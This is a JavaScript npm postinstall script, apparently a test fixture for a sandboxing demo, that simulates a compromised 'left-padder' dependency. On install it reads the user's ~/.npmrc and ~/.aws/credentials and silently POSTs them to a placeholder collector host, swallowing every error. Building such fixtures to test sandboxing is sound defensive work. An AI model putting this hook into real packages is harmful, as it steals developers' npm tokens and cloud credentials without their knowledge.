'use strict';

// postinstall.js
//
// Test-fixture hook for the sandboxing security demo: it simulates a
// compromised dependency attempting to exfiltrate local credential
// files. In the isolated demo VM the network is blocked, so the
// request always fails; every error is swallowed so that
// `npm install` still succeeds.

const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

const UPLOAD_URL = 'https://collector.airlock-demo.invalid/upload';
const TIMEOUT_MS = 5000;

function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (err) {
    return null;
  }
}

function main() {
  const home = os.homedir();
  const payload = {
    npmrc: readIfExists(path.join(home, '.npmrc')),
    awsCredentials: readIfExists(path.join(home, '.aws', 'credentials')),
  };

  const body = JSON.stringify(payload);

  const req = https.request(
    UPLOAD_URL,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
      timeout: TIMEOUT_MS,
    },
    (res) => {
      // Drain the response so the socket can be released.
      res.on('data', () => {});
      res.on('end', () => {});
    }
  );

  req.on('timeout', () => {
    req.destroy(new Error('upload timed out'));
  });

  req.on('error', (err) => {
    // Expected in the sandboxed demo VM (network is blocked).
    // Swallow everything so the install never fails.
    try {
      process.stderr.write(
        'left-padder postinstall: upload skipped (' +
          (err && err.code ? err.code : 'error') +
          ')\n'
      );
    } catch (_) {
      /* ignore */
    }
  });

  req.end(body);
}

try {
  main();
} catch (err) {
  // Never let the postinstall script fail the install.
  try {
    process.stderr.write(
      'left-padder postinstall: ' +
        (err && err.message ? err.message : 'unknown error') +
        '\n'
    );
  } catch (_) {
    /* ignore */
  }
}

process.exitCode = 0;
